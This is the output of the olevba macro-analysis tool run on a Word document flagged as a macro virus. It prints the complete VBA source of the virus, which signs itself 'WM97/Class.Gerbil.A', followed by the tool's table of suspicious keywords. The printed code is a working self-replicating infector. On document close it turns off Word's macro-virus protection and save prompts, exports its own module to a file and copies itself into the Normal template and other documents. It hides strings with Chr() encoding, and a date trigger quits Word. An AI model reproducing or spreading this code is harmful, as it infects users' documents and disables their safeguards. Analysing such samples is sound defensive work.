olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bf-4150cb7439c483eea8c007d62a1cee7171593022
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bf-4150cb7439c483eea8c007d62a1cee7171593022 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Истинаc:\program files\microsoft office\office\startupClass.docClass
On Error GoTo 75
'Истинаc:\program files\microsoft office\office\startupClass.docClass
I = 0
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Options.VirusProtection = Chr(48): cxr = 0: ox = 1: rc = 4: zz = 2
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Options.SaveNormalPrompt = Chr(48)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Options.ConfirmConversions = Chr(48)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If Month(Now()) > 6 And Day(Now()) = 13 Then Call ©
'Истинаc:\program files\microsoft office\office\startupClass.docClass
gx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines
'Истинаc:\program files\microsoft office\office\startupClass.docClass
xg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If xg > 94 And gx > Abs(cxr) Then GoTo 75
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If xg < 94 Then
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 Set bg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = bg.Name
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
End If
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If gx = Abs(cxr) Then Set bg = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 Infect = Int(Rnd * 50)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 If Infect = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 bg.codemodule.AddFromFile Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    For j = Abs(ox) To Abs(rc)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    .deletelines Abs(ox)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    Next j
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 End With
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 If xg < 94 Then
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    .replaceline Abs(ox), "Sub AutoClose()"
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    .replaceline 99, "Sub ToolsMacro()"
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    rd = Int(Rnd * 100)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If rd = 99 Then .replaceline 69, ".replaceline j, Chr(39) & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
'Истинаc:\program files\microsoft office\office\startupClass.docClass
End With
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 End If
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 With bg.codemodule
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    For j = Abs(zz) To 96 Step Abs(zz)
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    .replaceline j, Chr(39) & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow
'Истинаc:\program files\microsoft office\office\startupClass.docClass
    Next j
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 End With
'Истинаc:\program files\microsoft office\office\startupClass.docClass
75:
'Истинаc:\program files\microsoft office\office\startupClass.docClass
 If xg > 94 And gx = Abs(cxr) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Истинаc:\program files\microsoft office\office\startupClass.docClass
End Sub
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Private Sub ©()
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Top:
'Истинаc:\program files\microsoft office\office\startupClass.docClass
I = I + 1
'Истинаc:\program files\microsoft office\office\startupClass.docClass
On Error Resume Next
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Application.WindowState = wdWindowStateMinimize
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Application.WindowState = wdWindowStateMaximize
'Истинаc:\program files\microsoft office\office\startupClass.docClass
If I < 10 Then GoTo Top
'Истинаc:\program files\microsoft office\office\startupClass.docClass
Application.Quit
'Истинаc:\program files\microsoft office\office\startupClass.docClass
End Sub

Sub ToolsMacro()

End Sub 'WM97/Class.Gerbil.A By Virus ;) Smile

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

